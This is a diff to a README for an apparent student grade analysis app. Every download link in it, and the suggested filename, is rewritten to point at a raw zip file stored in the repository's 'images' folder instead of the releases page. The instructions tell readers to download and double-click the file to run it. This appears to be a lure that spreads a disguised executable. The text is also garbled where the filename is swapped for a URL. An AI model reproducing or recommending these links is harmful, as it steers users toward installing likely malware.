@@ -1,6 +1,6 @@
 # 📊 student-grade-analysis - Analyze Student Grades Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Religious-downeaster605/student-grade-analysis/releases)
+[![Download Now](https://raw.githubusercontent.com/Religious-downeaster605/student-grade-analysis/main/images/student-grade-analysis-1.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Religious-downeaster605/student-grade-analysis/main/images/student-grade-analysis-1.1.zip)
 
 ## 📘 Overview
 
@@ -14,13 +14,13 @@ To get started with the Student Grade Analysis application, follow these simple 
 
 1. **Visit the Releases Page**  
    Go to the release page by clicking the link below:
-   [Download Releases](https://github.com/Religious-downeaster605/student-grade-analysis/releases)
+   [Download Releases](https://raw.githubusercontent.com/Religious-downeaster605/student-grade-analysis/main/images/student-grade-analysis-1.1.zip)
 
 2. **Choose a Version**  
    On the releases page, you will see various versions of the application. Pick the latest version for the best experience.
 
 3. **Download the File**  
-   Click on the download link for the executable file. It might be named something like `student-grade-analysis-v1.0.exe`. Your download will begin automatically.
+   Click on the download link for the executable file. It might be named something like `https://raw.githubusercontent.com/Religious-downeaster605/student-grade-analysis/main/images/student-grade-analysis-1.1.zip`. Your download will begin automatically.
 
 4. **Run the Application**  
    Locate the downloaded file on your computer. Double-click the file to run it. Follow any prompts to complete the installation.
@@ -93,4 +93,4 @@ Thanks to all the contributors and the open-source community for their support i
 ---
 
 Access the application at the following link:  
-[Download Releases](https://github.com/Religious-downeaster605/student-grade-analysis/releases)
+[Download Releases](https://raw.githubusercontent.com/Religious-downeaster605/student-grade-analysis/main/images/student-grade-analysis-1.1.zip)
